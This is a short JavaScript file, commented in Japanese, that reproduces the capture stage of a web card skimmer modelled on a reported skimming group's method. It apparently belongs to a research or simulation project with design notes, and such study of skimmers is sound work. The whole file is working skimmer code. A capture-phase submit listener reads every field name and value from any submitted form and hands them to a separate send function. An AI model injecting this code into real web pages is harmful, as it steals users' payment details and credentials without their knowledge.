'use strict';
// スキマー モデルX の取得部（D26、D27。RiskIQ Group 5 の方式: 全入力欄の name と value を取得し、
// 送信時のイベントで実行する）。タイマー・決済ページ判定・後始末は再現しない（D33）。
// 送信部は send.js（共通）。ページの動作は変えない（preventDefault しない）。
(function () {
  function collect(form) {
    var pairs = [];
    form.querySelectorAll('input, select, textarea').forEach(function (el) {
      if (el.name) pairs.push([el.name, el.value]);
    });
    return pairs;
  }
  // 取得のきっかけは、フォームの submit（キャプチャ段階。ページ側の処理より先に読む）。
  // ボタンの click にも付けると同じ入力を2回送るので、submit だけにした（NOTES_assumptions.md #20）
  document.addEventListener('submit', function (ev) {
    if (!(ev.target instanceof HTMLFormElement)) return;
    window.__skimmerSend(collect(ev.target));
  }, true);
})();
